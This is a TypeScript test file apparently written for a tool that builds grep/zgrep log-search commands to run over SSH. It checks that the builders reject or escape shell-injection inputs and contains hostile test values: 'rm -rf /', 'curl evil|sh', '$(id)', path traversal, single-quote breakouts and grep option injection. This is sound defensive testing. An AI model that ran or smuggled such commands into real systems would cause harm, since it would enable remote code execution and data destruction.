import { describe, it, expect, vi, beforeEach } from "vitest";
import type { ServerEntry } from "@nrs/auth";

// Mock the SSH layer so searchLogs tests exercise only the stdout/stderr
// selection logic, not a real connection. vi.hoisted keeps the mock fn
// available inside the hoisted vi.mock factory.
const { sshExecMock } = vi.hoisted(() => ({ sshExecMock: vi.fn() }));
vi.mock("../../ssh-client.js", () => ({ sshExec: sshExecMock }));

import {
  buildLogSearchCommand,
  buildHttpdLogSearchCommand,
  searchLogs,
} from "../../commands/log-search.js";

describe("buildLogSearchCommand", () => {
  it("builds grep for current app log (no date)", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "ERROR", logType: "app",
      maxLines: 100, contextLines: 0,
    });
    expect(cmd).toContain("grep");
    expect(cmd).toContain("ERROR");
    expect(cmd).toContain("/apps_ux/logs/RRS/rrs-api");
    expect(cmd).toContain("rrs-api.log");
    expect(cmd).toContain("tail -100");
  });

  it("builds zgrep for dated gz log", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "ORA-", logType: "app",
      date: "2026-03-10",
      maxLines: 50, contextLines: 0,
    });
    expect(cmd).toContain("zgrep");
    expect(cmd).toContain("2026-03-10");
  });

  it("uses catalina log prefix for catalina type", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "Exception", logType: "catalina",
      maxLines: 100, contextLines: 0,
    });
    expect(cmd).toContain("catalina");
  });

  it("adds -C context flag when contextLines > 0", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "ERROR", logType: "app",
      maxLines: 100, contextLines: 3,
    });
    expect(cmd).toContain("-C 3");
  });

  it("rejects pattern with shell metacharacters", () => {
    expect(() => buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RRS", component: "rrs-api",
      pattern: "ERROR; rm -rf /", logType: "app",
      maxLines: 100, contextLines: 0,
    })).toThrow();
  });

  it("rejects app or component with shell metacharacters or path traversal", () => {
    const bad = ["x;curl evil|sh;", "a b", "../../etc", "app/../..", "rrs$(id)"];
    for (const value of bad) {
      expect(() => buildLogSearchCommand({
        logsBase: "/apps_ux/logs",
        app: value, component: "rrs-api",
        pattern: "ERROR", logType: "app",
        maxLines: 100, contextLines: 0,
      })).toThrow(/invalid characters/);
      expect(() => buildLogSearchCommand({
        logsBase: "/apps_ux/logs",
        app: "RRS", component: value,
        pattern: "ERROR", logType: "app",
        maxLines: 100, contextLines: 0,
      })).toThrow(/invalid characters/);
    }
  });

  it("accepts legitimate dotted/dashed app and component names", () => {
    expect(() => buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "RAR2.beta", component: "dms-document_api.v2",
      pattern: "ERROR", logType: "app",
      maxLines: 100, contextLines: 0,
    })).not.toThrow();
  });

  it("falls back to app-log discovery (excluding Tomcat logs) when <component>.log is absent", () => {
    // FTA's app log is APP-FTA.log, not fta.log. The fallback must list *.log
    // and exclude catalina/localhost/host-manager/manager/gc so it finds the
    // real app log instead of the (non-existent) conventional name.
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "FTA", component: "fta",
      pattern: "ERROR", logType: "app",
      maxLines: 100, contextLines: 0,
    });
    // Fast path still tries the conventional name first.
    expect(cmd).toContain("if [ -f /apps_ux/logs/FTA/fta/fta.log ]");
    // Fallback discovers any *.log, minus Tomcat's own logs.
    expect(cmd).toContain("ls -t /apps_ux/logs/FTA/fta/*.log");
    expect(cmd).toContain("grep -vE '/(catalina|localhost|host-manager|manager|gc)[._-]'");
  });

  it("keeps the fixed prefix glob for catalina (does not broaden discovery)", () => {
    const cmd = buildLogSearchCommand({
      logsBase: "/apps_ux/logs",
      app: "FTA", component: "fta",
      pattern: "Exception", logType: "catalina",
      maxLines: 100, contextLines: 0,
    });
    expect(cmd).toContain("ls -t /apps_ux/logs/FTA/fta/catalina*.log");
    expect(cmd).not.toContain("grep -vE");
  });
});

describe("log command builders reject trailing input terminators", () => {
  // ECMAScript's $ requires the end of input without the m flag. Exercise
  // the actual builders so a future regex flag/validation change cannot let
  // a valid-looking prefix introduce an unexpected shell-bound suffix.
  it.each([
    { label: "LF", suffix: "\n" },
    { label: "CR", suffix: "\r" },
    { label: "CRLF", suffix: "\r\n" },
    { label: "LINE SEPARATOR", suffix: "\u2028" },
    { label: "PARAGRAPH SEPARATOR", suffix: "\u2029" },
    { label: "NUL", suffix: "\0" },
  ])("rejects $label in every date and path identifier", ({ suffix }) => {
    const appBase = {
      logsBase: "/logs", app: "APP", component: "api",
      pattern: "ERROR", logType: "app" as const,
      maxLines: 100, contextLines: 0,
    };
    const httpdBase = {
      logsBase: "/logs", domain: "portal.example.invalid",
      pattern: "ERROR", logType: "access" as const,
      maxLines: 100, contextLines: 0,
    };
    for (const field of ["date", "dateFrom", "dateTo"] as const) {
      const invalid = { [field]: `2026-09-15${suffix}` };
      expect(() => buildLogSearchCommand({ ...appBase, ...invalid })).toThrow(/YYYY-MM-DD/);
      expect(() => buildHttpdLogSearchCommand({ ...httpdBase, ...invalid })).toThrow(/YYYY-MM-DD/);
    }
    expect(() => buildLogSearchCommand({ ...appBase, date: `today${suffix}` })).toThrow(/YYYY-MM-DD/);
    expect(() => buildHttpdLogSearchCommand({ ...httpdBase, date: `today${suffix}` })).toThrow(/YYYY-MM-DD/);
    for (const field of ["app", "component"] as const) {
      expect(() => buildLogSearchCommand({ ...appBase, [field]: `APP${suffix}` })).toThrow(/invalid characters/);
    }
    expect(() => buildHttpdLogSearchCommand({ ...httpdBase, domain: `portal.example.invalid${suffix}` }))
      .toThrow(/invalid characters/);
  });
});

describe("buildHttpdLogSearchCommand", () => {
  const base = {
    logsBase: "/sw_ux/httpd01/logs",
    domain: "portalext.example.gov.bc.ca",
    logType: "access" as const,
    pattern: "POST /api",
    maxLines: 100,
    contextLines: 0,
  };

  it("builds grep targeting hot subdir by default", () => {
    const cmd = buildHttpdLogSearchCommand(base);
    expect(cmd).toContain("/sw_ux/httpd01/logs/hot/");
    expect(cmd).toContain("portalext.example.gov.bc.ca-access");
    expect(cmd).toContain("POST /api");
    expect(cmd).toContain("tail -100");
  });

  it("targets cold subdir when specified", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, subdir: "cold" });
    expect(cmd).toContain("/sw_ux/httpd01/logs/cold/");
  });

  it("converts YYYY-MM-DD date to YYYY.MM.DD in filename", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, date: "2026-03-18" });
    expect(cmd).toContain("portalext.example.gov.bc.ca-access.2026.03.18.log");
    expect(cmd).not.toContain("2026-03-18");
  });

  it("handles 'today' date with dynamic date command", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, date: "today" });
    expect(cmd).toContain("$(date +%Y.%m.%d)");
  });

  it("searches newest file when no date specified", () => {
    const cmd = buildHttpdLogSearchCommand(base);
    expect(cmd).toContain("ls -t");
    expect(cmd).toContain("head -1");
  });

  it("builds error log filename", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, logType: "error", date: "2026-03-18" });
    expect(cmd).toContain("portalext.example.gov.bc.ca-error.2026.03.18.log");
  });

  it("supports date range with dateFrom/dateTo", () => {
    const cmd = buildHttpdLogSearchCommand({
      ...base,
      dateFrom: "2026-03-15",
      dateTo: "2026-03-18",
    });
    expect(cmd).toContain("2026-03-15");
    expect(cmd).toContain("2026-03-18");
    expect(cmd).toContain("tr '-' '.'");
  });

  it("adds -C context flag when contextLines > 0", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, contextLines: 5 });
    expect(cmd).toContain("-C 5");
  });

  it("rejects pattern with shell metacharacters", () => {
    expect(() => buildHttpdLogSearchCommand({
      ...base, pattern: "POST; rm -rf /",
    })).toThrow("shell metacharacters");
  });

  it("rejects domain with path traversal characters", () => {
    expect(() => buildHttpdLogSearchCommand({
      ...base, domain: "../../../etc/passwd",
    })).toThrow("invalid characters");
  });

  it("accepts 'default' as a valid domain", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, domain: "default" });
    expect(cmd).toContain("default-access");
  });

  it("falls back to .log.gz with zgrep for a specific date (cold archives)", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, subdir: "cold", date: "2026-04-01" });
    expect(cmd).toContain("portalext.example.gov.bc.ca-access.2026.04.01.log.gz");
    expect(cmd).toContain("zgrep");
    expect(cmd).toContain("/sw_ux/httpd01/logs/cold/");
  });

  it("uses a .log* glob and zgrep for the newest file (matches .log and .log.gz)", () => {
    const cmd = buildHttpdLogSearchCommand({ ...base, subdir: "cold" });
    expect(cmd).toContain("*.log*");
    expect(cmd).toContain("zgrep");
  });

  it("probes .log.gz siblings in date-range mode", () => {
    const cmd = buildHttpdLogSearchCommand({
      ...base,
      subdir: "cold",
      dateFrom: "2026-04-01",
      dateTo: "2026-04-03",
    });
    expect(cmd).toContain(".gz");
    expect(cmd).toContain("zgrep");
  });
});

describe("searchLogs (stdout/stderr selection)", () => {
  const entry = { logsBase: "/apps_ux/logs" } as unknown as ServerEntry;
  const params = {
    app: "RRS", component: "rrs-api",
    pattern: "ERROR", logType: "app" as const,
    maxLines: 100, contextLines: 0,
  };

  beforeEach(() => {
    sshExecMock.mockReset();
  });

  it("returns stdout when matches are found", async () => {
    sshExecMock.mockResolvedValue({ stdout: "42: ERROR boom", stderr: "", exitCode: 0 });
    const { output, exitCode } = await searchLogs(entry, params);
    expect(output).toBe("42: ERROR boom");
    expect(exitCode).toBe(0);
  });

  it("returns a clean message on zero matches (empty stdout and stderr)", async () => {
    sshExecMock.mockResolvedValue({ stdout: "", stderr: "", exitCode: 0 });
    const { output } = await searchLogs(entry, params);
    expect(output).toBe("No matching lines found.");
  });

  it("surfaces a genuine error from stderr when stdout is empty", async () => {
    sshExecMock.mockResolvedValue({
      stdout: "",
      stderr: "SERVER_A_PASSWORD not set. Add it to ~/.raven/.env.",
      exitCode: 1,
    });
    const { output, exitCode } = await searchLogs(entry, params);
    expect(output).toContain("SERVER_A_PASSWORD not set");
    expect(exitCode).toBe(1);
  });

  it("prefers stdout over stderr when both are present", async () => {
    sshExecMock.mockResolvedValue({
      stdout: "12: matched",
      stderr: "some warning noise",
      exitCode: 0,
    });
    const { output } = await searchLogs(entry, params);
    expect(output).toBe("12: matched");
  });
});

// ---------------------------------------------------------------------------
// RSEC-001 regression: single-quote breakout in the grep pattern.
//
// PATTERN_META never blocked the single quote, and the pattern was interpolated
// between literal quotes ('${pattern}'). A quote therefore closed the string
// literal and everything after it ran as shell. The fix escapes the pattern
// per-argument instead of widening the denylist, because `|` is legitimate
// grep -E alternation and must keep working.
// ---------------------------------------------------------------------------

/** POSIX single-quote escaping, redefined here so the test is independent of the implementation. */
const posixQuote = (s: string): string => "'" + s.replace(/'/g, "'\\''") + "'";

const baseParams = {
  logsBase: "/apps_ux/logs",
  app: "RRS",
  component: "rrs-api",
  logType: "app" as const,
  maxLines: 100,
  contextLines: 0,
};

describe("buildLogSearchCommand — shell injection hardening (RSEC-001)", () => {
  it("neutralizes a single-quote breakout instead of emitting a live pipeline", () => {
    const pattern = "FATAL' | id | '";
    const cmd = buildLogSearchCommand({ ...baseParams, pattern });

    // The vulnerable build emitted: grep -E -n -a 'FATAL' | id | '' /path
    expect(cmd).not.toContain("'FATAL' | id | ''");
    // The pattern must appear exactly as one escaped argument.
    expect(cmd).toContain(posixQuote(pattern));
  });

  it("still supports grep -E alternation, which legitimately uses the pipe", () => {
    const cmd = buildLogSearchCommand({ ...baseParams, pattern: "ERROR|FATAL" });
    expect(cmd).toContain(posixQuote("ERROR|FATAL"));
  });

  it("rejects a newline in the pattern", () => {
    expect(() => buildLogSearchCommand({ ...baseParams, pattern: "FATAL\nid" })).toThrow();
  });

  it("rejects a carriage return in the pattern", () => {
    expect(() => buildLogSearchCommand({ ...baseParams, pattern: "FATAL\rid" })).toThrow();
  });

  it("escapes the pattern in every branch of a date-range search", () => {
    // Uses the pipe form, not a semicolon: PATTERN_META already rejects `;`,
    // so a semicolon payload would never reach the interpolation under test.
    const pattern = "x' | id | '";
    const cmd = buildLogSearchCommand({
      ...baseParams, pattern, dateFrom: "2026-09-01", dateTo: "2026-09-02",
    });
    expect(cmd).not.toContain("'x' | id | ''");
    expect(cmd.split(posixQuote(pattern)).length - 1).toBeGreaterThanOrEqual(2); // grep + zgrep branches
  });
});

describe("buildHttpdLogSearchCommand — shell injection hardening (RSEC-001)", () => {
  const httpdBase = {
    logsBase: "/sw_ux/httpd01/logs",
    domain: "portalext.example.gov.bc.ca",
    logType: "access" as const,
    maxLines: 100,
    contextLines: 0,
  };

  it("neutralizes a single-quote breakout", () => {
    const pattern = "404' | id | '";
    const cmd = buildHttpdLogSearchCommand({ ...httpdBase, pattern });
    expect(cmd).not.toContain("'404' | id | ''");
    expect(cmd).toContain(posixQuote(pattern));
  });

  it("rejects a newline in the pattern", () => {
    expect(() => buildHttpdLogSearchCommand({ ...httpdBase, pattern: "404\nid" })).toThrow();
  });
});

// ---------------------------------------------------------------------------
// PR review follow-up: quoting does not stop grep's own option parsing. A
// pattern beginning with `-` is consumed as flags; `-v` additionally leaves
// grep with no pattern, so it takes the log path as the pattern and blocks on
// stdin until the SSH timeout fires.
// ---------------------------------------------------------------------------

describe("buildLogSearchCommand — grep option-injection guard", () => {
  it("passes a leading-dash pattern after -e so grep cannot read it as flags", () => {
    const cmd = buildLogSearchCommand({ ...baseParams, pattern: "-v" });
    expect(cmd).toContain("-e '-v'");
    expect(cmd).not.toMatch(/-a '-v'/);
  });

  it("guards the -e pattern form too", () => {
    const cmd = buildLogSearchCommand({ ...baseParams, pattern: "-e" });
    expect(cmd).toContain("-e '-e'");
  });

  it("applies the guard in the httpd builder as well", () => {
    const cmd = buildHttpdLogSearchCommand({
      logsBase: "/sw_ux/httpd01/logs", domain: "portalext.example.gov.bc.ca",
      logType: "access", pattern: "-v", maxLines: 10, contextLines: 0,
    });
    expect(cmd).toContain("-e '-v'");
  });
});

// ---------------------------------------------------------------------------
// Review follow-up (Issue 2): RSEC-001 hardened `pattern` but the `date`
// parameter, interpolated unquoted into the same command, was never validated.
// ---------------------------------------------------------------------------

describe("buildLogSearchCommand — date parameters are validated (RSEC-001 completion)", () => {
  it("rejects shell in date", () => {
    expect(() => buildLogSearchCommand({ ...baseParams, pattern: "ERROR", date: "x ]; id; [ -f y" })).toThrow();
    expect(() => buildLogSearchCommand({ ...baseParams, pattern: "ERROR", date: "$(id)" })).toThrow();
    expect(() => buildLogSearchCommand({ ...baseParams, pattern: "ERROR", date: "2026-09-14`id`" })).toThrow();
  });

  it("rejects shell in dateFrom / dateTo", () => {
    expect(() => buildLogSearchCommand({ ...baseParams, pattern: "ERROR", dateFrom: "2026-09-01'; id; '", dateTo: "2026-09-02" })).toThrow();
    expect(() => buildLogSearchCommand({ ...baseParams, pattern: "ERROR", dateFrom: "2026-09-01", dateTo: "$(id)" })).toThrow();
  });

  it("accepts the two documented forms", () => {
    expect(buildLogSearchCommand({ ...baseParams, pattern: "ERROR", date: "today" })).toContain("date +%Y-%m-%d");
    expect(buildLogSearchCommand({ ...baseParams, pattern: "ERROR", date: "2026-09-14" })).toContain("rrs-api.2026-09-14.log");
    expect(buildLogSearchCommand({ ...baseParams, pattern: "ERROR", dateFrom: "2026-09-01", dateTo: "2026-09-02" })).toContain("d='2026-09-01'");
  });
});

describe("buildHttpdLogSearchCommand — date parameters are validated", () => {
  const httpdBase = { logsBase: "/sw_ux/httpd01/logs", domain: "portalext.example.gov.bc.ca",
    logType: "access" as const, pattern: "404", maxLines: 10, contextLines: 0 };

  it("rejects shell in date", () => {
    expect(() => buildHttpdLogSearchCommand({ ...httpdBase, date: "x ]; id; [ -f y" })).toThrow();
    expect(() => buildHttpdLogSearchCommand({ ...httpdBase, date: "$(id)" })).toThrow();
  });

  it("rejects shell in dateFrom / dateTo", () => {
    expect(() => buildHttpdLogSearchCommand({ ...httpdBase, dateFrom: "'; id; '", dateTo: "2026-09-02" })).toThrow();
  });

  it("accepts documented forms", () => {
    expect(buildHttpdLogSearchCommand({ ...httpdBase, date: "2026-09-14" })).toContain("access.2026.09.14.log");
    expect(buildHttpdLogSearchCommand({ ...httpdBase, date: "today" })).toContain("date +%Y.%m.%d");
  });
});
